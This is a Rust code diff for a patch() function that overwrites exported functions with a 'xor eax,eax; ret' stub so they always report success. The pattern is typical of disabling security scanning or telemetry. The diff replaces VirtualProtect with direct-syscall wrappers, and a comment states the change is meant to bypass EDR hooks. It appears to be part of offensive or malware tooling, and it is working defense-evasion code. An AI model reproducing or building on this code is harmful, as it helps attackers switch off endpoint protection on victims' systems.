@@ -6,7 +6,6 @@
 #[cfg(target_os = "windows")]
 pub fn patch() {
     use windows_sys::Win32::System::LibraryLoader::{GetModuleHandleA, GetProcAddress};
-    use windows_sys::Win32::System::Memory::{VirtualProtect, PAGE_EXECUTE_READWRITE};
 
     // xor eax,eax (31 C0) + ret (C3) — clears eax and returns STATUS_SUCCESS
     const STUB: [u8; 3] = [0x31, 0xC0, 0xC3];
@@ -29,10 +28,10 @@ pub fn patch() {
             if func.is_none() { continue; }
 
             let addr = func.unwrap() as *mut u8;
-            let mut old = 0u32;
-            if VirtualProtect(addr as _, STUB.len(), PAGE_EXECUTE_READWRITE, &mut old) != 0 {
-                std::ptr::copy_nonoverlapping(STUB.as_ptr(), addr, STUB.len());
-                VirtualProtect(addr as _, STUB.len(), old, &mut old);
+            // PAGE_EXECUTE_READWRITE = 0x40 — bypass EDR hook on VirtualProtect
+            if let Some(old) = super::syscall::nt_virtual_protect(addr, STUB.len(), 0x40u32) {
+                super::syscall::nt_write_virtual_memory(addr, STUB.as_ptr(), STUB.len());
+                super::syscall::nt_virtual_protect(addr, STUB.len(), old);
             }
         }
     }
